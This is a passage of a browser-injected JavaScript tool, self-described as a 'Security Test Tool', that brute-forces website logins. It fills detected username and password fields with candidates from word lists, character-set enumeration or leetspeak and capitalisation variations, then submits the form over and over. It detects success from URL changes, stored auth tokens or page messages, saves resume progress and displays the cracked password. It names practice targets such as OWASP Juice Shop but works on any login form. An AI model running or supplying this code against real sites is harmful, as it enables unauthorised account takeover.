                                 localStorage.getItem('authToken') || sessionStorage.getItem('authToken');
                    if (token && token.length > 50) { // JWT tokens are typically long
                        return 'success';
                    }
                } catch (e) {
                    // Ignore localStorage errors
                }

                // Specific for the Waiworinao application
                const messageElement = document.getElementById('message');
                if (messageElement) {
                    // Check for success or error message
                    if (messageElement.classList.contains('success')) {
                        return 'success';
                    } else if (messageElement.classList.contains('error')) {
                        return 'error';
                    }
                }

                // Angular Material specific checks
                const matSnackBar = document.querySelector('simple-snack-bar');
                if (matSnackBar) {
                    const snackText = matSnackBar.textContent.toLowerCase();
                    if (snackText.includes('login') || snackText.includes('welcome') || 
                        snackText.includes('authentication successful')) {
                        return 'success';
                    }
                    if (snackText.includes('invalid') || snackText.includes('failed') || 
                        snackText.includes('error')) {
                        return 'error';
                    }
                }

                // General checks
                // Look for elements with success/error classes or typical message texts
                const successIndicators = [
                    '.success', '.alert-success', '[class*="success"]',
                    '.message.success', '[data-success]', '.mat-snack-bar-container',
                    '.notification.success', '.toast.success', '.alert.alert-success'
                ];

                const errorIndicators = [
                    '.error', '.alert-danger', '.alert-error', '[class*="error"]',
                    '.message.error', '[data-error]', '.notification.error', 
                    '.toast.error', '.alert.alert-danger'
                ];

                for (const selector of successIndicators) {
                    const elements = document.querySelectorAll(selector);
                    for (const el of elements) {
                        if (el.offsetParent !== null) { // Check if the element is visible
                            const text = el.textContent.toLowerCase();
                            if (text.includes('success') || text.includes('welcome') || 
                                text.includes('login') || text.includes('authenticated')) {
                                return 'success';
                            }
                        }
                    }
                }

                for (const selector of errorIndicators) {
                    const elements = document.querySelectorAll(selector);
                    for (const el of elements) {
                        if (el.offsetParent !== null) { // Check if the element is visible
                            const text = el.textContent.toLowerCase();
                            if (text.includes('invalid') || text.includes('failed') || 
                                text.includes('error') || text.includes('incorrect')) {
                                return 'error';
                            }
                        }
                    }
                }

                // Look for texts in the page that indicate success/failure
                const bodyText = document.body.innerText.toLowerCase();
                if (bodyText.includes('login successful') ||
                    bodyText.includes('successfully logged in') ||
                    bodyText.includes('welcome back') ||
                    bodyText.includes('authentication successful')) {
                    return 'success';
                }

                if (bodyText.includes('invalid username') ||
                    bodyText.includes('incorrect password') ||
                    bodyText.includes('login failed') ||
                    bodyText.includes('authentication failed') ||
                    bodyText.includes('invalid credentials')) {
                    return 'error';
                }

                return 'unknown';
            };

            document.getElementById('start-bf-button').addEventListener('click', async function () {
                try {
                if (running) return;

                const usernameFieldIdx = parseInt(document.getElementById('username-field-select').value);
                const passwordFieldIdx = parseInt(document.getElementById('password-field-select').value);
                const username = document.getElementById('bf-username').value.trim();
                const delay = parseInt(document.getElementById('bf-delay').value);
                const method = document.getElementById('bf-method').value;
                const passwordSource = document.getElementById('password-source').value;

                if (!username) {
                    updateStatus('Error: Please enter a username!', true);
                    return;
                }

                let passwordGenerator;
                let totalPasswords = 0;
                let finalVariations = []; // Declare outside the blocks

                if (method === 'list') {
                    // Get passwords depending on source
                    if (passwordSource === 'manual') {
                        const passwordListText = document.getElementById('bf-password-list').value.trim();

                        if (!passwordListText) {
                            updateStatus('Error: Please enter a password list!', true);
                            return;
                        }

                        passwords = passwordListText.split('\n').map(p => p.trim()).filter(p => p);
                    }

                    if (passwords.length === 0) {
                        updateStatus('Error: No valid passwords available!', true);
                        return;
                    }

                    let currentIndex = 0;
                    passwordGenerator = {
                        next: function () {
                            if (currentIndex >= passwords.length) {
                                return {done: true, value: null};
                            }
                            return {done: false, value: passwords[currentIndex++]};
                        }
                    };

                    totalPasswords = passwords.length;
                } else if (method === 'charset') {
                    // Use character set
                    const charset = buildCharset();
                    const minLength = parseInt(document.getElementById('min-length').value);
                    const maxLength = parseInt(document.getElementById('max-length').value);

                    if (charset.length === 0) {
                        updateStatus('Error: Please select a character set!', true);
                        return;
                    }

                    if (minLength > maxLength) {
                        updateStatus('Error: Minimum length cannot be greater than maximum length!', true);
                        return;
                    }

                    if (maxLength > 8) {
                        updateStatus('Error: Maximum length cannot be greater than 8 (browser limitation)!', true);
                        return;
                    }

                    // Calculate total number of possible passwords
                    let count = 0;
                    for (let len = minLength; len <= maxLength; len++) {
                        count += Math.pow(charset.length, len);
                    }

                    if (count > 100000) {
                        const confirmed = confirm(`Warning: ${count.toLocaleString()} possible passwords will be generated. This may take a long time and freeze the browser. Continue?`);
                        if (!confirmed) {
                            updateStatus('Brute-Force aborted.', false);
                            return;
                        }
                    }

                    passwordGenerator = createPasswordGenerator(charset, minLength, maxLength);
                    totalPasswords = count;
                } else {
                    // Use variations method
                    let basePhrases = [];
                    
                    // Check if we have multiple phrases or single phrase
                    if (window.multiplePhrases && window.multiplePhrases.length > 0) {
                        basePhrases = window.multiplePhrases;
                    } else {
                        const basePhrase = document.getElementById('base-phrase').value.trim();
                        if (!basePhrase) {
                            updateStatus('Error: Please enter a base phrase!', true);
                            return;
                        }
                        basePhrases = [basePhrase];
                    }
                    
                    const options = {
                        useLeetspeak: document.getElementById('use-leetspeak').checked,
                        useSeparators: document.getElementById('use-separators').checked,
                        useCapitalization: document.getElementById('use-capitalization').checked,
                        rushMode: document.getElementById('rush-mode').checked
                    };
                    
                    // Generate variations for each base phrase separately to track progress
                    const wordVariationsMap = new Map();
                    let allVariations = new Set();
                    
                    basePhrases.forEach(phrase => {
                        const variations = generateAllVariations(phrase, options);
                        wordVariationsMap.set(phrase, variations);
                        variations.forEach(v => allVariations.add(v));
                    });
                    
                    finalVariations = Array.from(allVariations);
                    
                    if (finalVariations.length === 0) {
                        updateStatus('Error: No variations generated!', true);
                        return;
                    }
                    
                    // Store generated passwords for later display
                    window.generatedPasswordsData = {
                        passwords: finalVariations,
                        basePhrases: basePhrases,
                        wordVariationsMap: wordVariationsMap
                    };
                    
                    // Don't automatically show the overlay
                    // createPasswordDisplayOverlay(finalVariations, basePhrases, wordVariationsMap);
                    
                    // Enhanced password generator with word tracking
                    let currentIndex = 0;
                    let currentWordIndex = 0;
                    let currentWordVariations = wordVariationsMap.get(basePhrases[0]) || [];
                    let currentWordVariationIndex = 0;
                    let generatorLocked = false; // Prevent race conditions
                    
                    // Store word tracking data globally
                    window.wordTrackingData = {
                        basePhrases,
                        wordVariationsMap,
                        currentWordIndex: 0,
                        totalWords: basePhrases.length
                    };
                    
                    passwordGenerator = {
                        next: function () {
                            if (generatorLocked) {
                                return {done: false, value: null};
                            }
                            
                            if (currentIndex >= finalVariations.length) {
                                return {done: true, value: null};
                            }
                            
                            generatorLocked = true;
                            const password = finalVariations[currentIndex++];
                            
                            // Update word tracking
                            if (currentWordVariations.includes(password)) {
                                currentWordVariationIndex++;
                                if (currentWordVariationIndex >= currentWordVariations.length) {
                                    // Move to next word
                                    currentWordIndex++;
                                    if (currentWordIndex < basePhrases.length) {
                                        currentWordVariations = wordVariationsMap.get(basePhrases[currentWordIndex]) || [];
                                        currentWordVariationIndex = 0;
                                        window.wordTrackingData.currentWordIndex = currentWordIndex;
                                    }
                                }
                            }
                            
                            generatorLocked = false;
                            return {done: false, value: password};
                        }
                    };
                    
                    totalPasswords = finalVariations.length;
                }

                running = true;
                stopRequested = false;
                startTime = Date.now();
                lastUpdateTime = null;
                attemptsHistory = [];
                document.getElementById('start-bf-button').style.display = 'none';
                document.getElementById('stop-bf-button').style.display = 'block';

                const usernameField = usernameFields[usernameFieldIdx].element;
                const passwordField = passwordFields[passwordFieldIdx].element;

                // Check if we should resume from saved progress
                let resumeFromIndex = 0;
                let allPasswordsArray = [];
                
                if (window.savedProgress && window.savedProgress.passwords && window.savedProgress.method === method) {
                    resumeFromIndex = window.savedProgress.currentIndex;
                    allPasswordsArray = window.savedProgress.passwords;
                    updateStatus(`Resuming from attempt ${resumeFromIndex.toLocaleString()}/${totalPasswords.toLocaleString()}...`);
                } else {
                    if (window.savedProgress && window.savedProgress.method !== method) {
                        updateStatus(`Previous progress found but different method - starting fresh...`);
                        window.savedProgress = null;
                    } else {
                        updateStatus(`Brute-Force started. Up to ${totalPasswords.toLocaleString()} passwords to test...`);
                    }
                }
                
                updateProgress(resumeFromIndex, totalPasswords);
                updateWordProgress(method);
                
                // If using multiple phrases, show the textarea with progress
                if (method === 'variations' && window.multiplePhrases && window.multiplePhrases.length > 1) {
                    const multiplePhraseSection = document.getElementById('multiple-phrases-section');
                    if (multiplePhraseSection) {
                        multiplePhraseSection.style.display = 'block';
                    }
                }

                // Find the form to which the fields belong
                let form = null;
                for (let f of forms) {
                    if (f.fields.includes(usernameField) || f.fields.includes(passwordField)) {
                        form = f.element;
                        break;
                    }
                }

                let count = resumeFromIndex;
                let result;
                let successfulPassword = null;
                let initialURL = window.location.href;
                
                // Store all passwords for saving progress
                if (method === 'variations') {
                    allPasswordsArray = finalVariations;
                } else if (method === 'list') {
                    allPasswordsArray = passwords;
                } else if (method === 'charset') {
                    // For charset method, we can't store all passwords (too many)
                    // Just store the first 1000 as a placeholder
                    allPasswordsArray = [];
                }
                
                // Skip to the resume index if resuming
                if (resumeFromIndex > 0) {
                    for (let i = 0; i < resumeFromIndex; i++) {
                        passwordGenerator.next();
                    }
                }

                // For each password:
                let maxAttempts = Math.min(totalPasswords, 1000000); // Limit to prevent infinite loops
                let attemptCount = 0;
                
                while (!(result = passwordGenerator.next()).done && attemptCount < maxAttempts) {
                    count++;
                    attemptCount++;

                    if (stopRequested) {
                        updateStatus('Brute-Force stopped.', false);
                        break;
                    }
                    
                    // Check if we hit the maximum attempts limit
                    if (attemptCount >= maxAttempts) {
                        updateStatus('Brute-Force stopped - maximum attempts reached to prevent infinite loop.', false);
                        break;
                    }

                    const password = result.value;
                    
                    // Skip null passwords from race condition
                    if (password === null) {
                        continue;
                    }

                    // Update current attempt display (not main status)
                    updateCurrentAttempt(count, totalPasswords, username, password);
                    updateProgress(count, totalPasswords);
                    updateWordProgress(method);
                    
                    // Save progress every 1000 attempts
                    if (count % 1000 === 0) {
                        const currentOptions = {
                            useLeetspeak: document.getElementById('use-leetspeak').checked,
                            useSeparators: document.getElementById('use-separators').checked,
                            useCapitalization: document.getElementById('use-capitalization').checked,
                            rushMode: document.getElementById('rush-mode').checked
                        };
                        saveProgress(usernameField, username, count, totalPasswords, allPasswordsArray, currentOptions, method);
                    }

                    // Fill in fields with error handling
                    try {
                        if (usernameField && usernameField.isConnected) {
                            usernameField.value = username;
                            triggerInputEvents(usernameField);
                        } else {
                            throw new Error('Username field not available');
                        }
                        
                        if (passwordField && passwordField.isConnected) {
                            passwordField.value = password;
                            triggerInputEvents(passwordField);
                        } else {
                            throw new Error('Password field not available');
                        }
                    } catch (error) {
                        updateStatus(`Error: Form fields no longer available - ${error.message}`, true);
                        running = false;
                        break;
                    }

                    // If a form exists, try a submission
                    if (form) {
                        // Save current URL
                        const startUrl = window.location.href;

                        // Check if a submit button exists
                        const submitButton = form.querySelector('button[type="submit"], input[type="submit"], button:not([type]), [role="button"]');

                        // Check if an onsubmit handler exists
                        const hasOnSubmitHandler = form.onsubmit !== null;

                        // Try to click the submit button or submit the form
                        if (submitButton) {
                            submitButton.click();
                        } else {
                            // For Angular apps like OWASP Juice Shop, try to find the login button by ID
                            const loginButton = document.querySelector('#loginButton, button#loginButton, [id="loginButton"]');
                            if (loginButton) {
                                loginButton.click();
                            } else if (!hasOnSubmitHandler) {
                                try {
                                    // Try to trigger an event if no submit button exists
                                    const submitEvent = new Event('submit', {
                                        bubbles: true,
                                        cancelable: true
                                    });
                                    form.dispatchEvent(submitEvent);
                                } catch (e) {
                                    console.error('Error triggering submit event:', e);
                                }
                            }
                        }

                        // Wait and then check for success/failure
                        await new Promise(resolve => setTimeout(resolve, delay));

                        // Check for URL change with validation
                        if (window.location.href !== startUrl) {
                            // Validate URL change is meaningful (not just hash change)
                            const oldUrl = new URL(startUrl);
                            const newUrl = new URL(window.location.href);
                            
                            if (oldUrl.pathname !== newUrl.pathname || oldUrl.search !== newUrl.search) {
                                // Meaningful URL change - probably successful login
                                successfulPassword = password;
                                updateInfoLine(username, password, 'Success (URL change)');
                                hideCurrentAttempt(); // Hide current attempt display
                                showSuccessMessage(username, successfulPassword);
                                break;
                            }
                        }

                        // Check login status through DOM changes
                        const loginStatus = checkLoginStatus();

                        // Update information line
                        if (loginStatus === 'success') {
                            updateInfoLine(username, password, 'Success! Correct password found');
                            successfulPassword = password;
                            clearProgress(usernameField, username); // Clear saved progress on success
                            showSuccessMessage(username, successfulPassword);
                            break;
                        } else if (loginStatus === 'error') {
                            updateInfoLine(username, password, 'Failed');
                        } else {
                            updateInfoLine(username, password, 'Uncertain (no clear response)');
                        }

                        // Also check for elements displayed in the Waiworinao demo
                        const attemptUsernameEl = document.getElementById('attempt-username');
                        const attemptPasswordEl = document.getElementById('attempt-password');
                        if (attemptUsernameEl && attemptPasswordEl) {
                            if (attemptUsernameEl.textContent === username && attemptPasswordEl.textContent === password) {
                                // Login attempt was registered, check for success/failure
                                const messageEl = document.getElementById('message');
                                if (messageEl && messageEl.classList.contains('success')) {
                                    updateInfoLine(username, password, 'Success! Correct password found');
                                    successfulPassword = password;
                                    showSuccessMessage(username, successfulPassword);
                                    break;
                                }
                            }
                        }
                    } else {
                        // If no form was found, try to click the login button directly
                        let loginButton = document.querySelector('#loginButton, button#loginButton, [id="loginButton"], button[aria-label*="login" i]');
                        
                        // If not found, search for buttons with login text
                        if (!loginButton) {
                            const buttons = document.querySelectorAll('button');
                            for (const btn of buttons) {
                                if (btn.textContent && (btn.textContent.toLowerCase().includes('login') || btn.textContent.toLowerCase().includes('log in'))) {
                                    loginButton = btn;
                                    break;
                                }
                            }
                        }
                        
                        if (loginButton) {
                            loginButton.click();
                        }
                        
                        await new Promise(resolve => setTimeout(resolve, delay));

                        // Check if the URL has changed (successful login)
                        if (window.location.href !== initialURL) {
                            successfulPassword = password;
                            updateInfoLine(username, password, 'Success (URL change)');
                            showSuccessMessage(username, successfulPassword);
                            break;
                        }

                        // Check login status through DOM changes
                        const loginStatus = checkLoginStatus();
                        if (loginStatus === 'success') {
                            updateInfoLine(username, password, 'Success! Correct password found');
                            successfulPassword = password;
                            clearProgress(usernameField, username); // Clear saved progress on success
                            showSuccessMessage(username, successfulPassword);
                            break;
                        } else if (loginStatus === 'error') {
                            updateInfoLine(username, password, 'Failed');
                        } else {
                            updateInfoLine(username, password, 'Uncertain (no clear response)');
                        }
                    }
                }

                running = false;
                document.getElementById('start-bf-button').style.display = 'block';
                document.getElementById('stop-bf-button').style.display = 'none';
                hideCurrentAttempt(); // Hide current attempt display

                if (!stopRequested && !successfulPassword) {
                    updateStatus('Brute-Force test completed. No successful password found.', false);
                    updateProgress(totalPasswords, totalPasswords); // Show 100% completion
                    clearProgress(usernameField, username); // Clear saved progress when completed
                }
                
                // Hide word progress when finished
                const variationsProgress = document.getElementById('variations-progress');
                if (variationsProgress) {
                    variationsProgress.style.display = 'none';
                }
                
                // Hide multiple phrases section when finished
                const multiplePhraseSection = document.getElementById('multiple-phrases-section');
                if (multiplePhraseSection) {
                    multiplePhraseSection.style.display = 'none';
                }
                } catch (error) {
                    updateStatus(`Error during brute-force: ${error.message}`, true);
                    running = false;
                    hideCurrentAttempt(); // Hide current attempt display
                    document.getElementById('start-bf-button').style.display = 'block';
                    document.getElementById('stop-bf-button').style.display = 'none';
                    console.error('Brute-force error:', error);
                }
            });

            document.getElementById('stop-bf-button').addEventListener('click', function () {
                stopRequested = true;
                updateStatus('Stopping Brute-Force test...', false);
                hideCurrentAttempt(); // Hide current attempt display
                // Hide progress section when stopping
                const progressSection = document.getElementById('progress-section');
                if (progressSection) {
                    progressSection.style.display = 'none';
                }
                // Hide word progress when stopping
                const variationsProgress = document.getElementById('variations-progress');
                if (variationsProgress) {
                    variationsProgress.style.display = 'none';
                }
                
                // Hide multiple phrases section when stopping
                const multiplePhraseSection = document.getElementById('multiple-phrases-section');
                if (multiplePhraseSection) {
                    multiplePhraseSection.style.display = 'none';
                }
            });
        }
    };

    // Helper function to trigger input events (important for JS frameworks)
    const triggerInputEvents = (element) => {
        // Focus
        element.focus();

        // Input event
        const inputEvent = new Event('input', {bubbles: true});
        element.dispatchEvent(inputEvent);

        // Change event
        const changeEvent = new Event('change', {bubbles: true});
        element.dispatchEvent(changeEvent);

        // Keydown/keyup events for extra measure
        const keydownEvent = new KeyboardEvent('keydown', {bubbles: true});
        element.dispatchEvent(keydownEvent);

        const keyupEvent = new KeyboardEvent('keyup', {bubbles: true});
        element.dispatchEvent(keyupEvent);
    };

    // Update status
    const updateStatus = (message, isError = false) => {
        const statusElement = document.getElementById('bf-status');
        if (statusElement) {
            statusElement.textContent = message;
            statusElement.style.backgroundColor = isError ? '#6b2b2b' : '#2C2E3B';
        }
    };
    
    // Update current attempt display (separate from status)
    const updateCurrentAttempt = (count, total, username, password) => {
        const currentAttemptElement = document.getElementById('current-attempt');
        if (currentAttemptElement) {
            currentAttemptElement.style.display = 'block';
            currentAttemptElement.textContent = `Current: ${count.toLocaleString()}/${total.toLocaleString()} - ${username} / ${password}`;
        }
    };
    
    // Hide current attempt display
    const hideCurrentAttempt = () => {
        const currentAttemptElement = document.getElementById('current-attempt');
        if (currentAttemptElement) {
            currentAttemptElement.style.display = 'none';
        }
    };

    // Show successful passwords
    const showSuccessMessage = (username, password) => {
        // Create or update the success element
        let successElement = document.getElementById('success-message');
        if (!successElement) {
            successElement = document.createElement('div');
            successElement.id = 'success-message';
            successElement.style.cssText = `
        margin-top: 15px;
        padding: 10px;
        background-color: #2e5b2e;
        border-radius: 5px;
        color: white;
        font-weight: bold;
      `;
            document.getElementById('security-tool-content').appendChild(successElement);
        }

        // Update the content
        successElement.innerHTML = `
      <div style="font-size: 16px; margin-bottom: 5px;">✅ Successful login found!</div>
      <div style="margin-bottom: 5px;">Username: <span style="font-family: monospace;">${username}</span></div>
      <div style="margin-bottom: 5px;">Password: <span style="font-family: monospace;">${password}</span></div>
      <div style="font-size: 12px; margin-top: 10px; color: #aaffaa;">
        Login successful - Success indicator detected
      </div>
    `;

        // Scroll to success element
        successElement.scrollIntoView({behavior: 'smooth'});

        // Update status
        updateStatus(`Success! Password found: ${password}`, false);
    };

    // Show UI
    createUI();
    
    // Add debug info
    const addDebugInfo = () => {
        const debugInfo = document.createElement('div');
        debugInfo.id = 'debug-info';
        debugInfo.style.cssText = `
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 12px;
            z-index: 9998;
            max-width: 300px;
        `;
        
        const updateDebugInfo = () => {
            const forms = document.querySelectorAll('form');
            const inputs = document.querySelectorAll('input');
            const passwords = document.querySelectorAll('input[type="password"]');
            const emails = document.querySelectorAll('input[type="email"]');
            const matFields = document.querySelectorAll('mat-form-field');
            const appLogin = document.querySelectorAll('app-login');
            
            debugInfo.innerHTML = `
                <strong>Debug Info:</strong><br>
                Forms: ${forms.length}<br>
                Inputs: ${inputs.length}<br>
                Passwords: ${passwords.length}<br>
                Emails: ${emails.length}<br>
                Mat-Fields: ${matFields.length}<br>
                App-Login: ${appLogin.length}<br>
                URL: ${window.location.href.substring(0, 50)}...
            `;
        };
        
        updateDebugInfo();
        setInterval(updateDebugInfo, 2000);
        
        debugInfo.onclick = () => debugInfo.remove();
        document.body.appendChild(debugInfo);
    };
    
    // Don't automatically show debug info
    // addDebugInfo();
    
    // SPA Support: Handle dynamically loaded forms (optimized for OWASP Juice Shop)
    const setupSPASupport = () => {
        let rescannedOnce = false;
        
        // Add rescan button to UI
        const addRescanButton = () => {
            const existingButton = document.getElementById('rescan-forms-btn');
            if (existingButton) return;
            
            const toolbar = document.querySelector('#security-tool-content');
            if (toolbar) {
                const rescanButton = document.createElement('button');
                rescanButton.id = 'rescan-forms-btn';
                rescanButton.textContent = 'Rescan Forms';
                rescanButton.style.cssText = `
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    padding: 8px 16px;
                    border-radius: 4px;
                    cursor: pointer;
                    margin: 10px 0;
                    font-size: 14px;
                `;
                rescanButton.addEventListener('click', () => {
                    console.log('Manual rescan triggered');
                    
                    // Force a more aggressive scan
                    setTimeout(() => {
                        const forms = scanForms();
                        const fields = scanForFields();
                        console.log('Manual scan results:', forms.length, 'forms,', fields.length, 'fields');
                        
                        // Try alternative selectors for OWASP Juice Shop
                        const altInputs = document.querySelectorAll('[name="email"], [name="password"], #email, #password, input[id*="email"], input[id*="password"]');
                        console.log('Alternative inputs found:', altInputs.length);
                        
                        createUI();
                        addRescanButton();
                    }, 100);
                });
                toolbar.insertBefore(rescanButton, toolbar.firstChild);
            }
        };
        
        // Delayed rescan for SPAs - multiple attempts with longer delays
        const performDelayedScans = () => {
            if (rescannedOnce) return;
            rescannedOnce = true;
            
            // First scan after 2 seconds
            setTimeout(() => {
                const forms = scanForms();
                const fields = scanForFields();
                
                console.log('First delayed scan:', forms.length, 'forms,', fields.length, 'fields');
                
                if (forms.length > 0 || fields.length > 0) {
                    createUI();
                    addRescanButton();
                    return;
                }
                
                // Second scan after 5 seconds
                setTimeout(() => {
                    const forms2 = scanForms();
                    const fields2 = scanForFields();
                    
                    console.log('Second delayed scan:', forms2.length, 'forms,', fields2.length, 'fields');
                    
                    if (forms2.length > 0 || fields2.length > 0) {
                        createUI();
                        addRescanButton();
                        return;
                    }
                    
                    // Third scan after 10 seconds
                    setTimeout(() => {
                        const forms3 = scanForms();
                        const fields3 = scanForFields();
                        
                        console.log('Third delayed scan:', forms3.length, 'forms,', fields3.length, 'fields');
                        
                        if (forms3.length > 0 || fields3.length > 0) {
                            createUI();
                            addRescanButton();
                        }
                    }, 5000);
                }, 3000);
            }, 2000);
        };
        
        // Enhanced MutationObserver specifically for Angular Material forms
        const observer = new MutationObserver((mutations) => {
            let shouldRescan = false;
            
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // Check for OWASP Juice Shop specific elements
                            const hasLoginForm = node.querySelector && (
                                node.querySelector('app-login') ||
                                node.querySelector('#login-form') ||
                                node.querySelector('#loginButton') ||
                                node.querySelector('input[name="email"]') ||
                                node.querySelector('input[name="password"]') ||
                                node.querySelector('mat-form-field') ||
                                node.querySelector('.mat-mdc-form-field') ||
                                node.querySelector('input[type="password"]') ||
                                node.querySelector('input[type="email"]') ||
                                node.querySelector('button[type="submit"]')
                            );
                            
                            // Also check if the node itself is one of these elements
                            const isLoginElement = node.tagName && (
                                node.tagName.toLowerCase() === 'app-login' ||
                                node.id === 'login-form' ||
                                node.id === 'loginButton' ||
                                node.name === 'email' ||
                                node.name === 'password' ||
                                node.classList.contains('mat-mdc-form-field') ||
                                node.type === 'password' ||
                                node.type === 'email'
                            );
                            
                            if (hasLoginForm || isLoginElement) {
                                shouldRescan = true;
                            }
                        }
                    });
                }
            });
            
            if (shouldRescan) {
                console.log('MutationObserver detected form changes, rescanning...');
                setTimeout(() => {
                    createUI();
                    addRescanButton();
                }, 500);
            }
        });
        
        // Start observing with more specific configuration
        observer.observe(document.body, {
            childList: true,
            subtree: true,
            attributes: false,
            attributeOldValue: false,
            characterData: false,
            characterDataOldValue: false
        });
        
        // Initial delayed scans
        performDelayedScans();
        addRescanButton();
        
        // Store observer for cleanup
        window.securityToolObserver = observer;
    };
    
    // Initialize SPA support
    setupSPASupport();

    // Setup cleanup function to prevent memory leaks
    const eventListeners = [];
    
    // Add cleanup function
    window.securityToolCleanup = function() {
        // Clear any running timeouts or intervals
        if (window.bruteForceTimeoutId) {
            clearTimeout(window.bruteForceTimeoutId);
            window.bruteForceTimeoutId = null;
        }
        
        // Disconnect MutationObserver
        if (window.securityToolObserver) {
            window.securityToolObserver.disconnect();
            window.securityToolObserver = null;
        }
        
        // Remove event listeners
        eventListeners.forEach(listener => {
            listener.element.removeEventListener(listener.event, listener.handler);
        });
        eventListeners.length = 0;
        
        // Clear global variables
        window.bruteForceRunning = false;
        window.multiplePhrases = null;
        window.wordTrackingData = null;
        window.savedProgress = null;
        
        console.log('%c[Security Test Tool] Cleanup completed', 'color: #4a6ed3;');
    };

    // Public API for the console
    window.securityTester = {
        rescan: createUI,
        getFormFields: scanForFields,
        getForms: scanForms,
        cleanup: window.securityToolCleanup
    };

    console.log('%c[Security Test Tool] Tool successfully initialized!', 'color: #4a6ed3; font-weight: bold;');
    console.log('You can perform manual scans with window.securityTester.rescan()');
})();
